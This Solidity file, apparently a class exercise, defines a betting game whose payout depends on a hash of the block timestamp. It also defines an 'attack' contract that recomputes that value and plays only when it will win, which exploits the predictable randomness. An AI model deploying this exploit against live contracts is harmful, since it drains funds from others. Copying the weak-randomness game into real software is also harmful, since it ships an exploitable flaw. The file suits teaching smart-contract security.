pragma solidity ^0.4.24;

contract class44_game{

    event win(address);
    int public kk =1;

    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now));
        return uint(ramdon) % 1000;
    }

    function play() public payable {
        if(get_random()>=500){
            kk+=1;
            msg.sender.transfer(0.02 ether);
            emit win(msg.sender);
        }
    }

    function () public payable{
        require(msg.value >= 1 ether);
    }

    constructor () public payable{
        msg.value >=1 ether;
    }
}

contract class44_attack{

    address public game = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;

    class44_game gamecontract = class44_game(game);

    function get_randon() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now));
        return uint(ramdon) % 1000;
    }

    function attack() public payable {
        require(get_randon()>=500);
        gamecontract.play();

    }

    function () public payable{

    }

    constructor () public payable{
    }
}
